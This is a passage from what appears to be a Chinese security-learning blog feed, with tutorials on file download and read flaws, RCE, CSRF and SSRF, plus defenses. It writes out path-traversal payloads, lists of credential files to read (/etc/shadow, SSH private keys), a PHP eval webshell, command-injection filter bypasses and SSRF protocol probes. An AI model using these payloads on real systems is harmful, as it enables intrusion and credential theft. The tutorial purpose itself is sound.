plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&amp;RealPath=</span><br><span class="line">&amp;FilePath=</span><br><span class="line">&amp;ﬁlepath=</span><br><span class="line">&amp;Filepath=</span><br><span class="line">&amp;Path=</span><br><span class="line">&amp;path=</span><br><span class="line">&amp;inputFile=</span><br><span class="line">&amp;Inputfile=</span><br><span class="line">&amp;url=</span><br><span class="line">&amp;urls=</span><br><span class="line">&amp;Lang=</span><br><span class="line">&amp;dis=</span><br><span class="line">&amp;data=</span><br><span class="line">&amp;Data=</span><br><span class="line">&amp;readﬁle=</span><br><span class="line">&amp;ﬁlep=</span><br><span class="line">&amp;src=</span><br><span class="line">&amp;menu=</span><br><span class="line">META-INF</span><br><span class="line">WEB-INF</span><br></pre></td></tr></table></figure><h2 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用</h2><p>任意文件下载漏洞的利用主要是为了信息收集，我们通过对服务器配置文件的下载，获取到大量的配置信息、源码，从而根据获取的信息来进一步挖掘服务器漏洞从而入侵。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">index.php?f=…/…/…/…/…/…/etc/passwd</span><br><span class="line">index.php?f=…/index.php</span><br><span class="line">index.php?f=ﬁle:///etc/passwd</span><br><span class="line">readfile.php?file=/etc/passwd</span><br></pre></td></tr></table></figure><h2 id="常见文件敏感文件"><a class="markdownIt-Anchor" href="#常见文件敏感文件"></a> 常见文件&amp;敏感文件</h2><ul><li><p>后台首页日志等可见文件（常见）</p></li><li><p><strong>数据库配置文件</strong></p></li><li><p><strong>各种接口文件</strong></p></li><li><p>密钥信息等文件</p></li><li><p>常见的敏感文件路径</p></li></ul><h3 id="windows"><a class="markdownIt-Anchor" href="#windows"></a> Windows</h3><p>C:\boot.ini //查看系统版本</p><p>C:\Windows\System32\inetsrv\MetaBase.xml //IIS配置文件</p><p>C:\Windows\repair\sam //存储系统初次安装的密码</p><p>C:\Program Files\mysql\my.ini //Mysql配置</p><p>C:\Program Files\mysql\data\mysql\user.MYD //Mysql root</p><p>C:\Windows\php.ini //php配置信息</p><p>C:\Windows\my.ini //Mysql配置信息</p><p>C:\Windows\win.ini //Windows系统的一个基本系统配置文件</p><h3 id="linux"><a class="markdownIt-Anchor" href="#linux"></a> Linux</h3><p>/root/.ssh/authorized_keys //如需登录到远程主机，需要到.ssh目录下，新建authorized_keys文件，并将id_rsa.pub内容复制进去</p><p>/root/.ssh/id_rsa //ssh私钥,ssh公钥是id_rsa.pub</p><p>/root/.ssh/id_ras.keystore //记录每个访问计算机用户的公钥</p><p>/root/.ssh/known_hosts //记录每个访问计算机用户的公钥</p><p>/etc/passwd //账户信息</p><p>/etc/shadow //账户密码文件</p><p>/etc/my.cnf //mysql配置文件</p><p>/etc/httpd/conf/httpd.conf //apache配置文件</p><p>/root/.bash_history //用户历史命令记录文件</p><p>/root/.mysql_history //mysql历史命令记录文件</p><p>/proc/mounts //记录系统挂载设备</p><p>/porc/config.gz //内核配置文件</p><p>/var/lib/mlocate/mlocate.db //全文件路径</p><p>/porc/self/cmdline //当前进程的cmdline参数</p><p>/usr/local/app/php5/lib/php.ini //PHP配置文件</p><h2 id="漏洞修复"><a class="markdownIt-Anchor" href="#漏洞修复"></a> 漏洞修复</h2><ol><li>部署WAF产品</li><li><strong>过滤<code>.</code>，使用户在url中不能回溯上级目录</strong></li><li>正则严格<strong>判断用户输入参数的格式</strong></li><li><strong>配置限定文件访问范围</strong>，目录权限设置或单独文件权限设置</li><li>将下载区独立出来，放在项目路径外，给每个下载资源固定的URL，而不是所有的下载资源都是统一的URL：<code>http://www.test.com/download?filename=文件名</code></li><li>净化数据：对用户传过来的文件名参数进行硬编码或统一编码，对文件类型进行白名单控制，对包含恶意字符或者空字符的参数进行拒绝。</li><li>任意文件下载漏洞也有可能是web所采用的中间件的版本低而导致问题的产生，例如ibm的websphere的任意文件下载漏洞，<strong>需更新其中间件的版本</strong>可修复。</li><li>要下载的文件地址保存至数据库中。</li><li>文件路径保存至数据库，让用户提交文件对应ID下载文件。</li><li>用户下载文件之前需要<strong>进行权限判断</strong>。</li><li>文件放在web无法直接访问的目录下。</li><li>不允许提供目录遍历服务。</li><li>公开文件可放置在web应用程序下载目录中通过链接进行下载。</li><li>记录文件下载日志。</li></ol><h1 id="文件读取"><a class="markdownIt-Anchor" href="#文件读取"></a> 文件读取</h1><p>任意文件读取是属于文件操作漏洞的一种，一般任意文件读取漏洞可以读取配置信息甚至系统重要文件。</p><p>漏洞产生原因：</p><ol><li>任意语言代码读取功能函数</li><li>文件读取函数：readfile()、file_get_contents()、fopen()中</li><li>$filename没有经过校验或者校验不合格</li><li>用户可控制变量读取任意文件，如/etc/passwd、./index.php、/config.ini</li></ol><h2 id="漏洞检测"><a class="markdownIt-Anchor" href="#漏洞检测"></a> 漏洞检测</h2><p>手工查看参数值及功能点（资源下载）</p><h2 id="漏洞利用-2"><a class="markdownIt-Anchor" href="#漏洞利用-2"></a> 漏洞利用</h2><p><code>readfile.php?f=../../../../../../etc/passwd</code><br />读取文件：配置文件（数据库，平台，各种敏感文件等）</p><h1 id="实例"><a class="markdownIt-Anchor" href="#实例"></a> 实例</h1><h2 id="java-web目录-roarctf-2019easy-java"><a class="markdownIt-Anchor" href="#java-web目录-roarctf-2019easy-java"></a> java web目录 [RoarCTF 2019]Easy Java</h2><p>一般来说，java web的配置文件必定存在于网页目录：<code>WEB-INF/web.xml</code>，里面有路由以及对应的servlet名等。</p><blockquote><p>Tricks：</p><ol><li>GET下载不了就换成POST。注意：单纯的修改是不行的，需要用Hackbar发送一个POST包才行。</li><li>java WEB-INF/web.xml文件泄露。所有源码文件都在class文件里，组件com.???.???实际上是文件夹com/???/???。</li></ol></blockquote><p><img src="/images/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%8E%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%9F%BA%E7%A1%80/image-20230603100636553.png" alt="image-20230603100636553" /></p><h2 id="小米路由cnvd漏洞"><a class="markdownIt-Anchor" href="#小米路由cnvd漏洞"></a> 小米路由CNVD漏洞</h2><p>任意文件读取可以登录后台。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;文件包含&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#文件包含&quot;&gt;&lt;/a&gt; 文件包含&lt;/h1&gt;
&lt;p&gt;即一次包含之后就不用再重新写相关代码，直接调用即可。程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用，</summary>
      
    
    
    
    <category term="渗透测试基础" scheme="https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="文件包含" scheme="https://j3f5.github.io/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
    <category term="文件读取" scheme="https://j3f5.github.io/tags/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"/>
    
  </entry>
  
  <entry>
    <title>RCE基础-代码执行&amp;命令执行</title>
    <link href="https://j3f5.github.io/articles/2023/06/02/RCE%E5%9F%BA%E7%A1%80-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C&amp;%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <id>https://j3f5.github.io/articles/2023/06/02/RCE%E5%9F%BA%E7%A1%80-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C&amp;%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</id>
    <published>2023-06-02T00:56:20.000Z</published>
    <updated>2023-06-02T00:56:17.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="rce概述"><a class="markdownIt-Anchor" href="#rce概述"></a> RCE概述</h1><p>RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。分为两类：</p><ul><li><p><strong>代码执行</strong></p><p><strong>因为需求设计，后台有时候也会把用户的输入作为代码的一部分进行执行，也就造成了远程代码执行漏洞</strong></p></li><li><p><strong>命令执行</strong></p><p><strong>一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口。比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上</strong>。一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。如果，设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器。</p></li></ul><p>注意的是，如果想要挖掘这样的漏洞，如果这个网站本身不需要这些功能，那么基本上就没有这些漏洞出现。所以此漏洞可利用的条件：</p><ol><li>有该拓展环境</li><li>漏洞函数</li><li>可控变量</li></ol><p><img src="/images/RCE%E5%9F%BA%E7%A1%80-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C&amp;%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/RCE-16856878790805.png" alt="RCE" /></p><h2 id="rce函数相关"><a class="markdownIt-Anchor" href="#rce函数相关"></a> RCE函数相关</h2><h3 id="php"><a class="markdownIt-Anchor" href="#php"></a> PHP</h3><h4 id="代码执行"><a class="markdownIt-Anchor" href="#代码执行"></a> 代码执行</h4><blockquote><p>eval()、assert()、preg_replace()、create_function()、array_map()、call_user_func()、call_user_func_array()、array_filter()、uasort()</p></blockquote><p><code>eval() </code>函数把字符串按照 PHP 代码来计算。该字符串必须是合法的 PHP 代码，且必须以分号结尾。</p><h4 id="命令执行"><a class="markdownIt-Anchor" href="#命令执行"></a> 命令执行</h4><blockquote><p>system()、exec()、shell_exec()、pcntl_exec()、popen()、proc_popen()、passthru()、反引号与<code>$()</code></p></blockquote><ol><li>有回显（执行并回显）</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(&#x27;ls&#x27;);?&gt;</span><br><span class="line">&lt;?php passthru(&#x27;ls&#x27;);?&gt;</span><br></pre></td></tr></table></figure><ol start="2"><li>无回显（执行但不回显）</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">echo exec(&#x27;ls&#x27;);</span><br><span class="line">echo &quot;&lt;/pre&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">echo shell_exec(&#x27;ls&#x27;);</span><br><span class="line">echo &quot;&lt;/pre&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="java命令执行"><a class="markdownIt-Anchor" href="#java命令执行"></a> JAVA（命令执行）</h3><p>在Java 开发语言中可以执行系统命令的函数有：</p><ol><li>Runtime.getRuntime.exec</li><li>ProcessBuilder.start</li></ol><p>其中，Runtime.getRuntime.exec 是在Java1.5 之前提供的，Java1.5 之后则提供了ProcessBuilder 类来构建进程</p><h4 id="processbuilder"><a class="markdownIt-Anchor" href="#processbuilder"></a> ProcessBuilder</h4><p>Java.lang.ProcessBuilder 类用于创建操作系统进程，每个ProcessBuilder 实例管理一个进程属性集。start() 方法利用这些属性创建一个新的Process 实例， 可以利用ProcessBuilder 执行命令。</p><p>ProcessBuilder 执行命令的方式如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ProcessBuilder</span> <span class="variable">pb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;myCommand&quot;</span>, <span class="string">&quot;myArg&quot;</span>); <span class="comment">//ProcessBuilder p = new ProcessBuilder(&quot;ls&quot;,&quot;-al&quot;);</span></span><br><span class="line"><span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> pb.start();</span><br></pre></td></tr></table></figure><h4 id="runtimegetruntime"><a class="markdownIt-Anchor" href="#runtimegetruntime"></a> Runtime.getRuntime</h4><p><code>java.lang.Runtime </code>公共类中的<code>exec()</code>方法同样也可以执行系统命令，<code>exec()</code>方法的使用方式有以下6 种：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在单独的进程中执行指定的字符串命令</span></span><br><span class="line"><span class="keyword">public</span> Process <span class="title function_">exec</span><span class="params">(String command)</span></span><br><span class="line"><span class="comment">//在单独的进程中执行指定的命令和参数</span></span><br><span class="line"><span class="keyword">public</span> Process <span class="title function_">exec</span><span class="params">(String[] cmdarray)</span></span><br><span class="line"><span class="comment">//在具有指定环境的单独进程中执行指定的命令和参数</span></span><br><span class="line"><span class="keyword">public</span> Process <span class="title function_">exec</span><span class="params">(String[] cmdarray, String[] envp)</span></span><br><span class="line"><span class="comment">//在具有指定环境和工作目录的单独进程中执行指定的命令和参数</span></span><br><span class="line"><span class="keyword">public</span> Process <span class="title function_">exec</span><span class="params">(String[] cmdarray, String[] envp, File dir)</span></span><br><span class="line"><span class="comment">//在具有指定环境的单独进程中执行指定的字符串命令</span></span><br><span class="line"><span class="keyword">public</span> Process <span class="title function_">exec</span><span class="params">(String command, String[] envp)</span></span><br><span class="line"><span class="comment">//在具有指定环境和工作目录的单独进程中执行指定的字符串命令</span></span><br><span class="line"><span class="keyword">public</span> Process <span class="title function_">exec</span><span class="params">(String command, String[] envp, File dir)</span></span><br></pre></td></tr></table></figure><p>正常执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Process proc = Runtime.getRuntime().exec(&quot;ping 127.0.0.1&quot;);</span><br></pre></td></tr></table></figure><p>与ProcessBuilder不同的是，如果他要执行多条命令，则需要输入数组，而非简单拼接：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Process</span> <span class="variable">proc</span> <span class="operator">=</span> Runtime.getRuntime().exec(<span class="string">&quot;ping 127.0.0.1;ls&quot;</span>);<span class="comment">//运行错误</span></span><br><span class="line">String[] command = &#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;ping -t 3 127.0.0.1;id&quot;</span>&#125;;</span><br><span class="line"><span class="type">Process</span> <span class="variable">pro</span> <span class="operator">=</span> Runtime.getRuntime().exec(command);<span class="comment">//执行成功，他是直接调用了ProcessBuilder执行</span></span><br></pre></td></tr></table></figure><p>所以产生拼接的命令执行漏洞就得按上面的写法，不然还不能拼接~</p><p>除此之外，使用这个函数还有很多<strong>需要注意的点</strong>：</p><ol><li><p>字符串执行需要替换空格（<code>$&#123;IFS&#125;</code>、<code>$IFS$9</code>）：</p><p>如果exec 方法执行的参数是字符串参数，参数中的空格会经过StringTokenizer 处理，处理完成后会改变原有的语义导致命令无法正常执行。例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cmd=sh -c ls;cat /etc/passwd //执行失败</span><br><span class="line">cmd=sh -c ls;id //执行成功</span><br><span class="line"></span><br><span class="line">cmd=sh -c ls;cat$&#123;IFS&#125;/etc/passwd //执行失败，因为我们的请求中包含无效的字符&#123;&#125;，它不属于保留字符，所以出错！</span><br><span class="line">cmd=sh%20-c%20ls;cat$%7BIFS%7D/etc/passwd //编码后执行成功，当然也可以使用$IFS$9</span><br></pre></td></tr></table></figure></li></ol><h1 id="挖掘与防范"><a class="markdownIt-Anchor" href="#挖掘与防范"></a> 挖掘与防范</h1><h2 id="挖掘"><a class="markdownIt-Anchor" href="#挖掘"></a> 挖掘</h2><p>黑盒测试：网站中有特殊功能，比如Ping、数据库备份等等。</p><p>白盒测试：查看命令执行函数是否做过滤。命令执行函数上述有提到</p><p>后面将会讲到其他漏洞的复现</p><h2 id="防范"><a class="markdownIt-Anchor" href="#防范"></a> 防范</h2><ul><li>敏感函数禁用，尽量不要使用命令执行函数，不能完全控制的危险函数最好不使用。</li><li>在进入执行命令函数前进行严格的检测和过滤；</li><li>部署WAF</li><li>多使用安全API，而不直接利用命令执行函数</li></ul><h1 id="利用与绕过"><a class="markdownIt-Anchor" href="#利用与绕过"></a> 利用与绕过</h1><h2 id="代码注入"><a class="markdownIt-Anchor" href="#代码注入"></a> 代码注入</h2><p>利用：利用后端脚本的特殊性对服务器进行攻击。</p><p>PHP：</p><ul><li>phpinfo<strong>可以获取到很多信息。例如收集</strong>绝对路径**，<strong>真实ip</strong>，<strong>绕过xss的httponly($_SERVER[“HTTP_COOKIE”])</strong>，存在oci8推测数据库可能为oracle。</li><li>eval写一句话木马getshell之类的。</li></ul><p>其绕过方式一般都是替换关键字、关键字大小写、编码等等过滤了PHP代码，可以使用<code>=</code>绕过：<code>&lt;?=eval($_REQUEST['cmd']);?&gt;</code></p><h2 id="命令注入"><a class="markdownIt-Anchor" href="#命令注入"></a> 命令注入</h2><p>利用该漏洞实际上就是通过管道符、拼接符等方式进行命令注入而达到攻击的目的。</p><p>这里写绕过姿势：</p><p>黑名单绕过：</p><ul><li><p>关键字绕过</p><ul><li><p>双引号：<code>l''s</code></p></li><li><p>反斜杠：<code>l\s</code></p></li><li><p>倒过来写：<code>tac</code> == <code>cat</code></p></li><li><p>替换：</p><p>cat可以由以下来代替</p><blockquote><p>(1)<code>more</code>:一页一页的显示的显示档案内容<br />(2)<code>less</code>:与<code>more</code>类似,但是比<code>more</code>更好的是,他可以[pg dn][pg up]翻页<br />(3)<code>head</code>:查看头几行<br />(4)<code>tac</code>:从最后一行开始显示,可以看出<code>tac</code>是<code>cat</code>的反向显示<br />(5)<code>tail</code>:查看尾几行<br />(6)<code>nl</code>:显示的时候,顺便输出行号<br />(7)<code>od</code>:以二进制的方式读取档案内容<br />(8)<code>vi</code>:一种编辑器，这个也可以查看<br />(9)<code>vim</code>:一种编辑器,这个也可以查看<br />(10)<code>sort</code>:可以查看<br />(11)<code>uniq</code>:可以查看<br />(12)<code>file -f</code>:报错出具体的内容<br /><strong>(13)<code>base64</code>:输出然后自己解码就好</strong></p></blockquote></li></ul></li><li><p>空格绕过</p><ul><li><code>&lt;&gt;</code>重定向：<code>cat&lt;flag_123</code></li><li><code>$IFS$9, $&#123;IFS&#125;</code>空字符</li><li>逗号与{}：<code>&#123;cat,flag_123&#125;</code></li></ul></li><li><p>管道符<code>&amp;</code>，<code>;</code>，<code>|</code>等被过滤（注意，windows不支持<code>;</code>）</p><ul><li>linux:<br /><code>%0a</code> 回车<br /><code>%0d </code>换行</li><li>windows:<br /><code>%0a</code> 回车<br /><code>%1a </code>作为.bat文件的命令分隔符</li></ul></li></ul><h1 id="其他"><a class="markdownIt-Anchor" href="#其他"></a> 其他</h1><h2 id="管道符的含义"><a class="markdownIt-Anchor" href="#管道符的含义"></a> 管道符的含义</h2><p><strong>Window系列支持的管道符如下所示。</strong></p><ul><li>&quot; | &quot;:直接执行后面的语句。例如：ping 127.0.0.1 | whoami。</li><li>“ || ”：如果前面执行的语句执行出错，则执行后面的语句，前面的语句只能为假。例如：<code>ping 127.0.0.1 || whoami</code></li><li>&quot; &amp; &quot; :如果前面的语句为假则直接执行后面的语句,前面的语句可真可假。例如：<code> ping 127.0.0.1 &amp;whoami</code>。</li><li>“ &amp;&amp; ”： 如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句只能为真。例如：<code>ping 127.0.0.1 &amp;&amp; whoami</code>。</li></ul><p><strong>Linux 系统支持的管道符如下所示：</strong></p><ul><li>“；”执行完前面的语句再执行后面的。例如: <code>ping 127.0.0.1;whoami</code></li><li>“ | ”：显示后面语句的执行结果。例如: <code>ping 127.0.0.1 | whoami</code>。</li><li>“ || ”： 当前面的语句执行出错时，执行后面的语句。例如： <code>ping 1|| whoami</code>。</li><li>“ &amp; ”： 如果前面的语句执行为假则直接执行后面的语句。前面的语句可真可假。例如：<code>ping 127.0.0.1 &amp; whoami</code>。</li><li>“ &amp;&amp; ”：如果前面的语句为假则直接出错，也不执行后面的，前面的语句只能为真。例如： <code>ping 127.0.0.1 &amp;&amp; whoami</code>。</li></ul><h2 id="poc与exp"><a class="markdownIt-Anchor" href="#poc与exp"></a> POC与EXP</h2><p>POC是验证</p><p>EXP是利用</p><h2 id="tips"><a class="markdownIt-Anchor" href="#tips"></a> TIPS</h2><p>一般使用base64输出文件内容，因为有的字符没办法在屏幕上看见</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;rce概述&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#rce概述&quot;&gt;&lt;/a&gt; RCE概述&lt;/h1&gt;
&lt;p&gt;RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。分为两类：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;</summary>
      
    
    
    
    <category term="渗透测试基础" scheme="https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="RCE" scheme="https://j3f5.github.io/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>CSRF与SSRF漏洞基础</title>
    <link href="https://j3f5.github.io/articles/2023/06/01/CSRF%E4%B8%8ESSRF%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/"/>
    <id>https://j3f5.github.io/articles/2023/06/01/CSRF%E4%B8%8ESSRF%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/</id>
    <published>2023-06-01T06:59:49.000Z</published>
    <updated>2023-06-01T06:59:49.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="csrf"><a class="markdownIt-Anchor" href="#csrf"></a> CSRF</h1><h2 id="概念以及原理"><a class="markdownIt-Anchor" href="#概念以及原理"></a> 概念以及原理</h2><p>Cross Site Request Forgery，跨站请求伪造，由客户端发起，是一种劫持受信任用户向服务器发送非预期请求的攻击方式，与XSS相似，但比XSS更难防范，常与XSS一起配合攻击。</p><p>顾名思义，也就是<strong>在a.com可以执行（发送）b.com的请求，例如请求b.com删除某个数据</strong>。</p><p>详细：</p><ol><li><p>攻击者盗用了你的身份信息，以你的名义发送恶意请求，对服务器来说这个请求是你发起的，却完成了攻击者所期望的一个操作</p></li><li><p>XSS 利用站点内内的信任用户，盗取cookie，CSRF通过伪装成受信任用户请求受信任的网站，利用目标用户的合法身份，以目标的名义执行某些非法参数</p></li><li><p>利用条件：</p><ol><li>已经登录系统</li><li>用户访问URL</li><li>已存在的网站中让用户跳转</li></ol></li></ol><p><img src="/images/CSRF%E4%B8%8ESSRF%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/2265061-20210123102622326-838621900.png" alt="img" /></p><p><img src="/images/CSRF%E4%B8%8ESSRF%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/2265061-20210123102631138-1077454166.png" alt="img" /></p><h2 id="防御"><a class="markdownIt-Anchor" href="#防御"></a> 防御</h2><ol><li>当用户发送重要的请求时输入<strong>验证码</strong></li><li>设置<strong>随机TOKEN</strong> <em>—数据包的唯一值</em></li><li><strong>检测referer来源</strong>，请求时判断请求连接是否为当前管理员正在使用的页面（管理员在编辑文章，黑客发来恶意的修改密码链接，因为修改密码页面管理员并没有在操作，所以攻击失败）</li><li><strong>限制请求方式只能为post</strong>。因为URL跳转一般都是GET，如果限制只能为POST，那么跳转不了，因为带不了数据包块</li></ol><h1 id="ssrf"><a class="markdownIt-Anchor" href="#ssrf"></a> SSRF</h1><h2 id="概念-原理与相关注意点"><a class="markdownIt-Anchor" href="#概念-原理与相关注意点"></a> 概念、原理与相关注意点</h2><p>Server-Side Request Forgery，服务器端请求伪造)，是一种由攻击者构造形成<strong>由服务端</strong>发起请求的一个安全漏洞。</p><p><strong>攻击目标</strong>：<strong>SSRF攻击的目标是从外网无法访问的内部系统</strong>。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p><p><strong>形成原因</strong>：<strong>由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制</strong>。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。</p><blockquote><p>除了http/https等方式可以造成ssrf，类似tcp connect 方式也可以探测内网一些ip 的端口是否开发服务，只不过危害比较小而已。</p></blockquote><img src="/images/CSRF%E4%B8%8ESSRF%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/SSRF-16856769157974.png" alt="SSRF" style="zoom:67%;" /><h2 id="可能出现的地方"><a class="markdownIt-Anchor" href="#可能出现的地方"></a> 可能出现的地方</h2><p>可能出现的地方</p><ol><li>社交分享功能：获取超链接的标题等内容进行显示</li><li>转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</li><li>在线翻译：给网址翻译对应网页的内容</li><li>图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片</li><li>图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验</li><li>云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试</li><li>网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作</li><li>数据库内置功能：数据库的比如mongodb的copyDatabase函数</li><li>邮件系统：比如接收邮件服务器地址</li><li>编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等</li><li>未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞</li><li>一些的url中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……</li><li>从远程服务器请求资源（upload from url 如discuz！；import &amp; expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）</li></ol><h2 id="漏洞检测"><a class="markdownIt-Anchor" href="#漏洞检测"></a> 漏洞检测</h2><p>一般发起网络请求中会使用libcurl库，所以他会有各种协议（可以简单执行<code>curl -V</code>）各个协议调用探针：http,file,dict,ftp,gopher 等</p><p>漏洞攻击：端口扫描，指纹识别，漏洞利用，内网探针等</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.64.144/phpmyadmin/</span><br><span class="line">file:///D:/www.txt</span><br><span class="line">dict://192.168.64.144:3306/info</span><br><span class="line">ftp://192.168.64.144:21</span><br></pre></td></tr></table></figure><h3 id="代码层面"><a class="markdownIt-Anchor" href="#代码层面"></a> 代码层面</h3><h4 id="php"><a class="markdownIt-Anchor" href="#php"></a> PHP</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents()</span><br><span class="line">fsockopen()</span><br><span class="line">curl_exec()</span><br></pre></td></tr></table></figure><p>以上三个函数使用不当会造成SSRF漏洞</p><p>需要注意以下几点：</p><ul><li>大部分 PHP 并不会开启 <code>fopen </code>的 gopher  wrapper</li><li>file_get_contents 的 gopher 协议不能 URLencode</li><li>file_get_contents 关于 Gopher 的 302 跳转有 bug，导致利用失败</li><li>curl/libcurl 7.43 上 gopher 协议存在 bug（%00 截断），经测试 7.49 可用</li><li>curl_exec() //默认不跟踪跳转</li><li>file_get_contents()  // file_get_contents支持php://input协议</li></ul><h4 id="java"><a class="markdownIt-Anchor" href="#java"></a> JAVA</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Request类，URL类的openStream，HttpClient类，URLConnection和HttpURLConnection类</span><br></pre></td></tr></table></figure><p>以上几种类引用不当会造成SSRF</p><p>网络请求支持的协议如下</p><p><code>http，https，file，ftp，mailto，jar，netdoc</code></p><p>对比php的ssrf，java这块利用相对局限</p><h2 id="绕过"><a class="markdownIt-Anchor" href="#绕过"></a> 绕过</h2><ol><li>数字IP（十进制IP等等）</li><li><code>?@#</code>特殊符号绕过：<code>www.baidu.com?www.me.com</code></li><li>子域名绕过</li><li>跳转IP（中转IP）</li><li>DNS重绑定（例如短地址）</li></ol><h2 id="利用"><a class="markdownIt-Anchor" href="#利用"></a> 